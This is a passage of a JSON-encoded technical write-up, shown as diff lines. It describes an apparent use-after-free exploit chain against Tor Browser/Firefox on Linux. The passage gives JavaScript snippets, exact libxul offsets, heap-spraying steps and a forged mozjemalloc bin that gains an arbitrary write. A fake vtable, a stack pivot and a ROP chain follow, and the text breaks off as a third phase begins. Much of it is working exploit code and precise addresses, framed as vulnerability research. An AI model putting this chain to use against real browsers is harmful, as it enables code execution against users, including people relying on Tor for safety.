+          "text": "...\n  function leakNativePointers(limit=65536){let v=bads[oobState.hit],out=[];for(let p=0;p<limit-\n  8;p+=8){let q=get64(v,p),lo=q&0xfffffn;if(lo===0xcd990n||\n  lo===0xcdd50n)out.push({p,q:'0x'+q.toString(16),libxul:'0x'+(q-(lo===0xcd990n?\n  0x91cd990n:0x91cdd50n)).toString(16)})}return out.slice(0,40)}\n...\n"
+        },
+        {
+          "type": "paragraph",
+          "text": "The UAF view interprets memory in eight-byte blocks and looks for a pointer whose ending is 0xcd990 or 0xcdd50. Those endings and their full offsets were previously identified in the exact binary. ASLR changes the libxul base, but not the internal positions of its vtables.",
+          "inlines": [
+            {
+              "text": "The UAF view interprets memory in eight-byte blocks and looks for a pointer whose ending is "
+            },
+            {
+              "code": true,
+              "text": "0xcd990"
+            },
+            {
+              "text": " or "
+            },
+            {
+              "code": true,
+              "text": "0xcdd50"
+            },
+            {
+              "text": ". Those endings and their full offsets were previously identified in the exact binary. ASLR changes the "
+            },
+            {
+              "code": true,
+              "text": "libxul"
+            },
+            {
+              "text": " base, but not the internal positions of its "
+            },
+            {
+              "bold": true,
+              "text": "vtables"
+            },
+            {
+              "text": "."
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "The calculation is (real example):",
+          "inlines": [
+            {
+              "text": "The calculation is (real example):"
+            }
+          ]
+        },
+        {
+          "type": "code",
+          "text": "leaked pointer:    0x7487d99cd990\nvtable offset:          0x91cd990\n                    ----------------\nlibxul base:       0x7487d0800000"
+        },
+        {
+          "type": "paragraph",
+          "text": "If it does not find the pointer, it reuses the popup and repeats this phase. When it finds it, it saves nativeBase and begins the 512 MiB pass for the UAF region.",
+          "inlines": [
+            {
+              "bold": true,
+              "text": "If it does not find the pointer, it reuses the popup and repeats this phase. When it finds it, it saves "
+            },
+            {
+              "bold": true,
+              "code": true,
+              "text": "nativeBase"
+            },
+            {
+              "bold": true,
+              "text": " and begins the 512 MiB pass for the UAF region."
+            }
+          ]
+        },
+        {
+          "type": "heading",
+          "text": "UAF: Get UAF region base",
+          "inlines": [
+            {
+              "text": "UAF: Get UAF region base"
+            }
+          ],
+          "level": 4
+        },
+        {
+          "type": "paragraph",
+          "text": "With this UAF we intend to obtain a 512 MiB observation range to have many controlled objects and know their absolute address.",
+          "inlines": [
+            {
+              "text": "With this UAF we intend to obtain a 512 MiB observation range to have many controlled objects and know their absolute address."
+            }
+          ]
+        },
+        {
+          "type": "code",
+          "text": "opener -> navigates the same popup to bootstrap2\npopup -> creates 512 MiB victim\nopener/popup -> create another UAF\npopup -> creates 240,000 marked 97-byte ArrayBuffers\nopener -> searches for markers using the old view\nopener -> child.checkFake(id, 5)\n"
+        },
+        {
+          "type": "paragraph",
+          "text": "The popup creates the 512 MiB victim and repeats the BYOB sequence already explained",
+          "inlines": [
+            {
+              "text": "The "
+            },
+            {
+              "bold": true,
+              "text": "popup"
+            },
+            {
+              "text": " creates the 512 MiB "
+            },
+            {
+              "code": true,
+              "text": "victim"
+            },
+            {
+              "text": " and repeats the BYOB sequence already explained"
+            }
+          ]
+        },
+        {
+          "type": "code",
+          "text": "...\nlet victim=new Uint8Array(i===0?0x20000000:size);\nlet r=new ReadableStreamBYOBReader(host.makeStream(i));\nreaders.push(r);r.read(victim).catch(()=>{});\n...\n"
+        },
+        {
+          "type": "paragraph",
+          "text": "It then creates 5,000 buffers per round for 48 rounds. fakeBytes is 97 and the first five bytes store a signature and an ID:",
+          "inlines": [
+            {
+              "text": "It then creates 5,000 buffers per round for 48 rounds. "
+            },
+            {
+              "code": true,
+              "text": "fakeBytes"
+            },
+            {
+              "text": " is 97 and the first five bytes store a signature and an ID:"
+            }
+          ]
+        },
+        {
+          "type": "code",
+          "text": "...\nlet i=fakes.length,b=new ArrayBuffer(fakeBytes),v=new Uint8Array(b);\nv[0]=0xc1;v[1]=i&255;v[2]=(i>>8)&255;\nv[3]=(i>>16)&255;v[4]=0x1c;fakes.push(b);\n...\n"
+        },
+        {
+          "type": "paragraph",
+          "text": "The opener searches for that signature through the UAF view, extracts the ID and proves that it can modify the corresponding live buffer:",
+          "inlines": [
+            {
+              "text": "The opener searches for that signature through the UAF view, extracts the ID and proves that it can modify the corresponding live buffer:"
+            }
+          ]
+        },
+        {
+          "type": "code",
+          "text": "...\nlet id=start[1]|(start[2]<<8)|(start[3]<<16);\nbads[hit][anchor+5]=0x6d;\nlet inside=child.checkFake(id,5);\n...\n"
+        },
+        {
+          "type": "paragraph",
+          "text": "The 97-byte buffers are rounded to native 112-byte slots. Each contains a marker with its ID and remains live in fakes[]. The 240,000 allocations increase the probability that several complete runs appear inside the old 512 MiB interval. A run (arena_run_t) is a 4 KiB page that mozjemalloc internally creates or reuses to group allocations of the same class. In this case each run contains 36 112-byte backing stores, corresponding to the ArrayBuffer(97) (64 header bytes + 36 slots × 112 bytes = 4096 bytes = 4 KiB per run).",
+          "inlines": [
+            {
+              "text": "The 97-byte buffers are rounded to native 112-byte slots. Each contains a marker with its ID and remains live in "
+            },
+            {
+              "code": true,
+              "text": "fakes[]"
+            },
+            {
+              "text": ". The 240,000 allocations increase the probability that several complete runs appear inside the old 512 MiB interval. A run ("
+            },
+            {
+              "code": true,
+              "text": "arena_run_t"
+            },
+            {
+              "text": ") is a 4 KiB page that mozjemalloc internally creates or reuses to group allocations of the same class. In this case each run contains 36 112-byte backing stores, corresponding to the "
+            },
+            {
+              "code": true,
+              "text": "ArrayBuffer(97)"
+            },
+            {
+              "text": " (64 header bytes + 36 slots × 112 bytes = 4096 bytes = 4 KiB per run)."
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "This would be the arena_run_t structure:",
+          "inlines": [
+            {
+              "text": "This would be the "
+            },
+            {
+              "code": true,
+              "text": "arena_run_t"
+            },
+            {
+              "text": " structure:"
+            }
+          ]
+        },
+        {
+          "type": "code",
+          "text": "  +0x00  mRunListElem.next\n  +0x08  mRunListElem.prev\n  +0x10  mBin\n  +0x18  mRegionsMinElement / mNumFree\n  +0x20  allocation bitmap\n  +0x40  first controlled 112-byte region\n  +0xb0  next controlled region"
+        },
+        {
+          "type": "paragraph",
+          "text": "When the UAF view finds a marker, it decodes its ID and writes 0x6d. If the popup reads 109 from fakes[id], it confirms that the old view and the new buffer reach the same bytes. It then writes 0x7d to another marker; reading 125 from another fake demonstrates access between different allocations.",
+          "inlines": [
+            {
+              "text": "When the UAF view finds a marker, it decodes its ID and writes "
+            },
+            {
+              "code": true,
+              "text": "0x6d"
+            },
+            {
+              "text": ". If the popup reads 109 from "
+            },
+            {
+              "code": true,
+              "text": "fakes[id]"
+            },
+            {
+              "text": ", it confirms that the old view and the new buffer reach the same bytes. It then writes "
+            },
+            {
+              "code": true,
+              "text": "0x7d"
+            },
+            {
+              "text": " to another marker; reading 125 from another "
+            },
+            {
+              "code": true,
+              "text": "fake"
+            },
+            {
+              "text": " demonstrates access between different allocations."
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "The exploit locates the headers of those runs by looking for a header followed by two markers separated by 112 bytes. It releases a buffer from the first run and another from the second. The allocator links them as second -> first, storing the absolute native address of the first in the second. Since the view already knows the relative offset of the first, it can calculate it.",
+          "inlines": [
+            {
+              "text": "The exploit locates the headers of those runs by looking for a header followed by two markers separated by 112 bytes. It releases a buffer from the first run and another from the second. The allocator links them as "
+            },
+            {
+              "code": true,
+              "text": "second -> first"
+            },
+            {
+              "text": ", storing the absolute native address of the first in the second. Since the view already knows the relative offset of the first, it can calculate it."
+            }
+          ]
+        },
+        {
+          "type": "code",
+          "text": "initial state ((run A) and (run B) inside the 512 MiB UAF region)\n(run A) -> all its slots occupied (36/36)\n(run B) -> all its slots occupied (36/36)\n"
+        },
+        {
+          "type": "code",
+          "text": "popup -> releases a fake from (run A) through ArrayBuffer.transfer(0) (35/36)\nallocator -> (run A) goes from full to available (35/36)\nbin.head -> (run A)\n"
+        },
+        {
+          "type": "code",
+          "text": "popup -> releases a fake from (run B) through ArrayBuffer.transfer(0) (35/36)\nallocator -> (run B) goes from full to available (35/36)\nbin.head -> (run B)\nB.next   -> (run A)\nmRegionsMask -> indicates which B slot became free\n"
+        },
+        {
+          "type": "paragraph",
+          "text": "After B.next -> A, the exploit simply reads B.next and obtains the address of A (the run, not the ArrayBuffer). The only thing it has to do is subtract A's offset, and it obtains the UAF region base address.",
+          "inlines": [
+            {
+              "text": "After "
+            },
+            {
+              "code": true,
+              "text": "B.next -> A"
+            },
+            {
+              "text": ", the exploit simply reads "
+            },
+            {
+              "code": true,
+              "text": "B.next"
+            },
+            {
+              "text": " and obtains the address of A (the run, not the "
+            },
+            {
+              "code": true,
+              "text": "ArrayBuffer"
+            },
+            {
+              "text": "). The only thing it has to do is subtract A's offset, and it obtains the UAF region base address."
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "Example:",
+          "inlines": [
+            {
+              "text": "Example:"
+            }
+          ]
+        },
+        {
+          "type": "code",
+          "text": "first run offset, hs[0] = 0x1a840\nabsolute pointer read, h1 = 0x7f4a2c11a840"
+        },
+        {
+          "type": "code",
+          "text": "base = 0x7f4a2c11a840 - 0x1a840\nbase = 0x7f4a2c100000"
+        },
+        {
+          "type": "paragraph",
+          "text": "The equivalent operation in the exploit is:",
+          "inlines": [
+            {
+              "text": "The equivalent operation in the exploit is:"
+            }
+          ]
+        },
+        {
+          "type": "code",
+          "text": "let h1 = get64(v, hs[1]);\nlet base = h1 - BigInt(hs[0]);\n"
+        },
+        {
+          "type": "paragraph",
+          "text": "Therefore, bads[hit][0] corresponds to native address 0x7f4a2c100000. An object found at offset 0x1b000 will be at 0x7f4a2c100000 + 0x1b000 = 0x7f4a2c11b000.",
+          "inlines": [
+            {
+              "text": "Therefore, "
+            },
+            {
+              "code": true,
+              "text": "bads[hit][0]"
+            },
+            {
+              "text": " corresponds to native address "
+            },
+            {
+              "code": true,
+              "text": "0x7f4a2c100000"
+            },
+            {
+              "text": ". An object found at offset "
+            },
+            {
+              "code": true,
+              "text": "0x1b000"
+            },
+            {
+              "text": " will be at "
+            },
+            {
+              "code": true,
+              "text": "0x7f4a2c100000 + 0x1b000 = 0x7f4a2c11b000"
+            },
+            {
+              "text": "."
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "Another example: if the first run appears at hs[0] = 0x1e80 and the absolute pointer read from the second run is h1 = 0x7bbb85505000, the exploit obtains heapBase = 0x7bbb85505000 - 0x1e80 = 0x7bbb85503180 (this is the UAF region base address corresponding to view[0] not the base of the entire heap). From then on, it converts any offset p in the view into a native address through heapBase + p.",
+          "inlines": [
+            {
+              "text": "Another example: if the first run appears at "
+            },
+            {
+              "code": true,
+              "text": "hs[0] = 0x1e80"
+            },
+            {
+              "text": " and the absolute pointer read from the second run is "
+            },
+            {
+              "code": true,
+              "text": "h1 = 0x7bbb85505000"
+            },
+            {
+              "text": ", the exploit obtains "
+            },
+            {
+              "code": true,
+              "text": "heapBase = 0x7bbb85505000 - 0x1e80 = 0x7bbb85503180"
+            },
+            {
+              "text": " (this is the UAF region base address corresponding to "
+            },
+            {
+              "code": true,
+              "text": "view[0]"
+            },
+            {
+              "text": " "
+            },
+            {
+              "bold": true,
+              "text": "not the base of the entire heap"
+            },
+            {
+              "text": "). From then on, it converts any offset "
+            },
+            {
+              "code": true,
+              "text": "p"
+            },
+            {
+              "text": " in the view into a native address through "
+            },
+            {
+              "code": true,
+              "text": "heapBase + p"
+            },
+            {
+              "text": "."
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "Now as attackers we have the libxul base address, the absolute address of the controlled region, and several reachable runs. But we still need to move from heap-limited writing to a qword write over a target in libxul.",
+          "inlines": [
+            {
+              "text": "Now as attackers we have the "
+            },
+            {
+              "code": true,
+              "text": "libxul"
+            },
+            {
+              "text": " base address, the absolute address of the controlled region, and several reachable runs. But we still need to move from heap-limited writing to a qword write over a target in "
+            },
+            {
+              "code": true,
+              "text": "libxul"
+            },
+            {
+              "text": "."
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "NOTE: we need 3 runs in the 512 MiB range, 2 to obtain the UAF region base address as we have seen, and the other one will be explained below.",
+          "inlines": [
+            {
+              "bold": true,
+              "text": "NOTE: we need 3 runs in the 512 MiB range, 2 to obtain the UAF region base address as we have seen, and the other one will be explained below."
+            }
+          ]
+        },
+        {
+          "type": "heading",
+          "text": "Second Phase: UAF to ROP",
+          "inlines": [
+            {
+              "text": "Second Phase: UAF to ROP"
+            }
+          ],
+          "level": 3
+        },
+        {
+          "type": "paragraph",
+          "text": "With the current UAF, we have free writing throughout the 512 MiB range, but our objective is a pointer inside libxul, TARGET = libxulBase + 0x9578ee0. This address contains the global pointer with which the renderer accesses its observer service. In this section we will see how to overwrite it to replace it with a fake object.",
+          "inlines": [
+            {
+              "text": "With the current UAF, we have free writing throughout the 512 MiB range, but our objective is a pointer inside "
+            },
+            {
+              "code": true,
+              "text": "libxul"
+            },
+            {
+              "text": ", "
+            },
+            {
+              "code": true,
+              "text": "TARGET = libxulBase + 0x9578ee0"
+            },
+            {
+              "text": ". This address contains the global pointer with which the renderer accesses its observer service. In this section we will see how to overwrite it to replace it with a fake object."
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "(Completing a full Firefox compromise would require an additional way to execute our code in the parent process. Our ROP chain still runs under Tor Browser’s level-6 Linux content sandbox. The history forgery lets us trigger privileged navigation and the DevTools connection, but it does not establish arbitrary memory access or code execution in the parent.)",
+          "inlines": [
+            {
+              "text": "(Completing a full Firefox compromise would require an additional way to execute our code in the parent process. Our ROP chain still runs under Tor Browser’s level-6 Linux content sandbox. The history forgery lets us trigger privileged navigation and the DevTools connection, but it does not establish arbitrary memory access or code execution in the parent.)"
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "The reason for that particular pointer is that there is a path reachable from JavaScript that uses it. console.error() reaches the logging system and publishes a notification through the observer service. If we end up overwriting it, it allows the gadget we want to finally be called, thus corrupting the execution flow.",
+          "inlines": [
+            {
+              "text": "The reason for that particular pointer is that there is a path reachable from JavaScript that uses it. "
+            },
+            {
+              "code": true,
+              "text": "console.error()"
+            },
+            {
+              "text": " reaches the logging system and publishes a notification through the observer service. If we end up overwriting it, it allows the gadget we want to finally be called, thus corrupting the execution flow."
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "As we said before, three runs are needed, the first two for the UAF region address and the third (which we will call H) will be used for the corruption.",
+          "inlines": [
+            {
+              "text": "As we said before, three "
+            },
+            {
+              "code": true,
+              "text": "runs"
+            },
+            {
+              "text": " are needed, the first two for the UAF region address and the third (which we will call "
+            },
+            {
+              "code": true,
+              "text": "H"
+            },
+            {
+              "text": ") will be used for the corruption."
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "For this phase we will again review the arena_run_t structure:",
+          "inlines": [
+            {
+              "text": "For this phase we will again review the "
+            },
+            {
+              "code": true,
+              "text": "arena_run_t"
+            },
+            {
+              "text": " structure:"
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "Its header contains mBin, a pointer to the real bin that manages its slots.",
+          "inlines": [
+            {
+              "text": "Its header contains "
+            },
+            {
+              "code": true,
+              "text": "mBin"
+            },
+            {
+              "text": ", a pointer to the real bin that manages its slots."
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "A bin (arena_bin_t) is the \"administrative record\" that mozjemalloc maintains for a size class. There is a 112-byte bin that stores the size of its slots, records that each run has 36 slots starting at offset 64 (bytes), and keeps a list of the runs that still have room. The bin does not contain the buffers, all runs of that class share its information by pointing to it from the mBin field in their header.",
+          "inlines": [
+            {
+              "text": "A bin ("
+            },
+            {
+              "code": true,
+              "text": "arena_bin_t"
+            },
+            {
+              "text": ") is the \"administrative record\" that mozjemalloc maintains for a size class. There is a 112-byte bin that stores the size of its slots, records that each run has 36 slots starting at offset 64 (bytes), and keeps a list of the runs that still have room. The bin does not contain the buffers, all runs of that class share its information by pointing to it from the "
+            },
+            {
+              "code": true,
+              "text": "mBin"
+            },
+            {
+              "text": " field in their header."
+            }
+          ]
+        },
+        {
+          "type": "code",
+          "text": "run A.mBin (used in 512MiB region leak) ─┐\nrun B.mBin (used in 512MiB region leak) ─┼─> 112-byte bin -> list of available runs\nrun H.mBin (    memory corruption     ) ─┘\n"
+        },
+        {
+          "type": "paragraph",
+          "text": "The structure would be the following:",
+          "inlines": [
+            {
+              "text": "The structure would be the following:"
+            }
+          ]
+        },
+        {
+          "type": "code",
+          "text": "struct arena_bin_t {\n    DoublyLinkedList<arena_run_t> mNonFullRuns; // +0x00: head, +0x08: tail\n    size_t   mSizeClass;                        // +0x10\n    uint32_t mRunNumRegions;                    // +0x18\n    uint32_t mRunNumRegionsMask;                // +0x1c\n    uint32_t mRunFirstRegionOffset;             // +0x20\n    uint32_t mNumRuns;                          // +0x24\n    FastDivisor<uint16_t> mSizeDivisor;         // +0x28\n    uint8_t  mRunSizePages;                     // +0x2a\n};\n"
+        },
+        {
+          "type": "paragraph",
+          "text": "When a buffer from H is released, the allocator consults H.mBin to know which list that run should be inserted into.",
+          "inlines": [
+            {
+              "text": "When a buffer from "
+            },
+            {
+              "code": true,
+              "text": "H"
+            },
+            {
+              "text": " is released, the allocator consults "
+            },
+            {
+              "code": true,
+              "text": "H.mBin"
+            },
+            {
+              "text": " to know which list that run should be inserted into."
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "That is why we create a false bin for the 112-byte allocation class:",
+          "inlines": [
+            {
+              "text": "That is why we create a false bin for the 112-byte allocation class:"
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "Offset",
+          "inlines": [
+            {
+              "bold": true,
+              "text": "Offset"
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "Forged value",
+          "inlines": [
+            {
+              "bold": true,
+              "text": "Forged value"
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "Function",
+          "inlines": [
+            {
+              "bold": true,
+              "text": "Function"
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "+0x00",
+          "inlines": [
+            {
+              "code": true,
+              "text": "+0x00"
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "TARGET - 8",
+          "inlines": [
+            {
+              "code": true,
+              "text": "TARGET - 8"
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "Fake non-full-run-list head and arbitrary-write destination",
+          "inlines": [
+            {
+              "text": "Fake non-full-run-list head and arbitrary-write destination"
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "+0x08",
+          "inlines": [
+            {
+              "code": true,
+              "text": "+0x08"
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "0",
+          "inlines": [
+            {
+              "code": true,
+              "text": "0"
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "List tail (initially zero, so pushFront() replaces it with the address of H)",
+          "inlines": [
+            {
+              "text": "List tail (initially zero, so "
+            },
+            {
+              "code": true,
+              "text": "pushFront()"
+            },
+            {
+              "text": " replaces it with the address of H)"
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "+0x10",
+          "inlines": [
+            {
+              "code": true,
+              "text": "+0x10"
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "112",
+          "inlines": [
+            {
+              "code": true,
+              "text": "112"
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "Allocation size class",
+          "inlines": [
+            {
+              "text": "Allocation size class"
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "+0x18",
+          "inlines": [
+            {
+              "code": true,
+              "text": "+0x18"
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "36",
+          "inlines": [
+            {
+              "code": true,
+              "text": "36"
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "Regions per run (unused because the fake head is non-null)",
+          "inlines": [
+            {
+              "text": "Regions per run (unused because the fake head is non-null)"
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "+0x1c",
+          "inlines": [
+            {
+              "code": true,
+              "text": "+0x1c"
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "2",
+          "inlines": [
+            {
+              "code": true,
+              "text": "2"
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "Number of allocation-bitmap words",
+          "inlines": [
+            {
+              "text": "Number of allocation-bitmap words"
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "+0x20",
+          "inlines": [
+            {
+              "code": true,
+              "text": "+0x20"
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "64",
+          "inlines": [
+            {
+              "code": true,
+              "text": "64"
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "Offset from the run header to its first region",
+          "inlines": [
+            {
+              "text": "Offset from the run header to its first region"
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "+0x24",
+          "inlines": [
+            {
+              "code": true,
+              "text": "+0x24"
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "Run counter (not used in the selected one-free branch)",
+          "inlines": [
+            {
+              "text": "Run counter (not used in the selected one-free branch)"
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "+0x28",
+          "inlines": [
+            {
+              "code": true,
+              "text": "+0x28"
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "0x0493",
+          "inlines": [
+            {
+              "code": true,
+              "text": "0x0493"
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "Fast-division multiplier for division by 112",
+          "inlines": [
+            {
+              "text": "Fast-division multiplier for division by 112"
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "+0x2a",
+          "inlines": [
+            {
+              "code": true,
+              "text": "+0x2a"
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "1",
+          "inlines": [
+            {
+              "code": true,
+              "text": "1"
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "Number of 4 KiB pages in a 112-byte-class run",
+          "inlines": [
+            {
+              "text": "Number of 4 KiB pages in a 112-byte-class run"
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "The code would be:",
+          "inlines": [
+            {
+              "text": "The code would be:"
+            }
+          ]
+        },
+        {
+          "type": "code",
+          "text": "...\nfor (let i = 0; i < 48; i++) v[f + i] = 0;\nput64(v, f, TARGET - 8n);\nput64(v, f + 16, 112n);\nv[f + 24] = 36;\nv[f + 28] = 2;\nv[f + 32] = 64;\nv[f + 40] = 0x93;\nv[f + 41] = 0x04;\nv[f + 42] = 1;\n...\n"
+        },
+        {
+          "type": "paragraph",
+          "text": "Basically, the address of the false bin (FA) is written in the mBin field of H (this being at 36/36). Now, in the false bin, in the head (0x00) we put TARGET-8, so that when we release an ArrayBuffer from H (35/36), Gecko uses H's mBin and has to put it in the false bin, and writes the address of H in the prev field located at TARGET, thus making *TARGET = H.",
+          "inlines": [
+            {
+              "text": "Basically, the address of the false bin ("
+            },
+            {
+              "code": true,
+              "text": "FA"
+            },
+            {
+              "text": ") is written in the "
+            },
+            {
+              "code": true,
+              "text": "mBin"
+            },
+            {
+              "text": " field of "
+            },
+            {
+              "code": true,
+              "text": "H"
+            },
+            {
+              "text": " (this being at 36/36). Now, in the false bin, in the head (0x00) we put "
+            },
+            {
+              "code": true,
+              "text": "TARGET-8"
+            },
+            {
+              "text": ", so that when we release an "
+            },
+            {
+              "code": true,
+              "text": "ArrayBuffer"
+            },
+            {
+              "text": " from "
+            },
+            {
+              "code": true,
+              "text": "H"
+            },
+            {
+              "text": " (35/36), Gecko uses "
+            },
+            {
+              "code": true,
+              "text": "H"
+            },
+            {
+              "text": "'s "
+            },
+            {
+              "code": true,
+              "text": "mBin"
+            },
+            {
+              "text": " and has to put it in the false bin, and writes the address of H in the "
+            },
+            {
+              "code": true,
+              "text": "prev"
+            },
+            {
+              "text": " field located at TARGET, thus making "
+            },
+            {
+              "code": true,
+              "text": "*TARGET = H"
+            },
+            {
+              "text": "."
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "That is:",
+          "inlines": [
+            {
+              "text": "That is:"
+            }
+          ]
+        },
+        {
+          "type": "code",
+          "text": "  H: 36/36 slots occupied\n  H.mBin = address of FA\n  FA.head = TARGET - 8"
+        },
+        {
+          "type": "code",
+          "text": "  one H slot is released\n  -> H becomes 35/36\n  -> Gecko consults H.mBin and obtains FA\n  -> tries to insert H in front of FA.head\n  -> interprets TARGET-8 as a run\n  -> writes the address of H in its prev field\n  -> that field is at TARGET-8+8\n  -> *TARGET = address of H (address of the controlled real run)\n"
+        },
+        {
+          "type": "paragraph",
+          "text": "This would be the code on the Popup side to release the fake:",
+          "inlines": [
+            {
+              "text": "This would be the code on the "
+            },
+            {
+              "bold": true,
+              "text": "Popup"
+            },
+            {
+              "text": " side to release the fake:"
+            }
+          ]
+        },
+        {
+          "type": "code",
+          "text": "...\n  function freeFake(i){\n   if(!(i>=0&&i<fakes.length)||!fakes[i])return false;\n   let b=fakes[i];\n   fakes[i]=null;\n   let z=b.transfer(0);\n   return b.byteLength===0&&z.byteLength===0\n  }\n...\n"
+        },
+        {
+          "type": "heading",
+          "text": "Modifying H to a false object",
+          "inlines": [
+            {
+              "text": "Modifying "
+            },
+            {
+              "code": true,
+              "text": "H"
+            },
+            {
+              "text": " to a false object"
+            }
+          ],
+          "level": 4
+        },
+        {
+          "type": "paragraph",
+          "text": "The TARGET pointer directs the observer service toward H. We then overwrite H as if it were a valid C++ object whose first qword points to a fake vtable created in another area under our control, which contains gadget addresses (in this case, from the particular version of libxul).",
+          "inlines": [
+            {
+              "text": "The "
+            },
+            {
+              "code": true,
+              "text": "TARGET"
+            },
+            {
+              "text": " pointer directs the "
+            },
+            {
+              "italic": true,
+              "text": "observer service"
+            },
+            {
+              "text": " toward "
+            },
+            {
+              "code": true,
+              "text": "H"
+            },
+            {
+              "text": ". We then overwrite "
+            },
+            {
+              "code": true,
+              "text": "H"
+            },
+            {
+              "text": " as if it were a valid C++ object whose first qword points to a fake vtable created in another area under our control, which contains gadget addresses (in this case, from the particular version of "
+            },
+            {
+              "code": true,
+              "text": "libxul"
+            },
+            {
+              "text": ")."
+            }
+          ]
+        },
+        {
+          "type": "code",
+          "text": "TARGET -> H, fake object\nH[0]   -> V, fake vtable\nV[...] -> stack pivot gadget\nRS     -> qwords of the ROP chain\n"
+        },
+        {
+          "type": "paragraph",
+          "text": "The popup calls console.error(). The logging path publishes a notification through the observer service. Gecko reads the global pointer from TARGET, receives H and makes a virtual call:",
+          "inlines": [
+            {
+              "text": "The "
+            },
+            {
+              "bold": true,
+              "text": "popup"
+            },
+            {
+              "text": " calls "
+            },
+            {
+              "code": true,
+              "text": "console.error()"
+            },
+            {
+              "text": ". The logging path publishes a notification through the observer service. Gecko reads the global pointer from "
+            },
+            {
+              "code": true,
+              "text": "TARGET"
+            },
+            {
+              "text": ", receives H and makes a virtual call:"
+            }
+          ]
+        },
+        {
+          "type": "code",
+          "text": "...\n  function triggerLog(){\n    console.error('native-stdio-trigger');\n    return true\n  }\n...\npopup -> console.error()\nGecko -> consults TARGET\nTARGET -> H\nGecko -> reads H's V vtable\nGecko -> executes the chosen gadget\ngadget -> moves RSP to RS (stack pivot)\nrenderer -> starts the ROP chain\n"
+        },
+        {
+          "type": "paragraph",
+          "text": "The unexploited form would be:",
+          "inlines": [
+            {
+              "text": "The unexploited form would be:"
+            }
+          ]
+        },
+        {
+          "type": "code",
+          "text": "console.error()\n-> Gecko needs to publish the message\n-> obtains the legitimate observer service from TARGET\n-> reads its vtable\n-> calls NotifyObservers()\n"
+        },
+        {
+          "type": "paragraph",
+          "text": "But fortunately or unfortunately...",
+          "inlines": [
+            {
+              "text": "But fortunately or unfortunately..."
+            }
+          ]
+        },
+        {
+          "type": "list",
+          "ordered": true,
+          "items": [
+            {
+              "inlines": [
+                {
+                  "text": "Gecko enters from JavaScript into C++ code to record the error."
+                }
+              ]
+            },
+            {
+              "inlines": [
+                {
+                  "text": "It reads "
+                },
+                {
+                  "code": true,
+                  "text": "*TARGET"
+                },
+                {
+                  "text": ", expecting to obtain the observer service, but obtains "
+                },
+                {
+                  "code": true,
+                  "text": "H"
+                },
+                {
+                  "text": "."
+                }
+              ]
+            },
+            {
+              "inlines": [
+                {
+                  "text": "To call its virtual method, it reads the first eight bytes of "
+                },
+                {
+                  "code": true,
+                  "text": "H"
+                },
+                {
+                  "text": " and obtains the address of "
+                },
+                {
+                  "code": true,
+                  "text": "V"
+                },
+                {
+                  "text": ", the fake vtable."
+                }
+              ]
+            },
+            {
+              "inlines": [
+                {
+                  "text": "It looks in "
+                },
+                {
+                  "code": true,
+                  "text": "V"
+                },
+                {
+                  "text": " for the address of the method it wants to execute, but that entry contains the address of the gadget."
+                }
+              ]
+            },
+            {
+              "inlines": [
+                {
+                  "text": "That gadget changes "
+                },
+                {
+                  "bold": true,
+                  "text": "RSP"
+                },
+                {
+                  "text": ", the pointer to the current stack, so that it points to "
+                },
+                {
+                  "bold": true,
+                  "text": "RS"
+                },
+                {
+                  "text": "."
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "RS is an area of the controlled heap containing addresses placed by the exploit.",
+          "inlines": [
+            {
+              "bold": true,
+              "code": true,
+              "text": "RS"
+            },
+            {
+              "bold": true,
+              "text": " is an area of the controlled heap containing addresses placed by the exploit."
+            }
+          ]
+        },
+        {
+          "type": "heading",
+          "text": "Third Phase: ROP forges the parent's history",
+          "inlines": [
+            {
+              "text": "Third Phase: ROP forges the parent's history"
+            }
+          ],
+          "level": 3
+        },
+        {
+          "type": "paragraph",
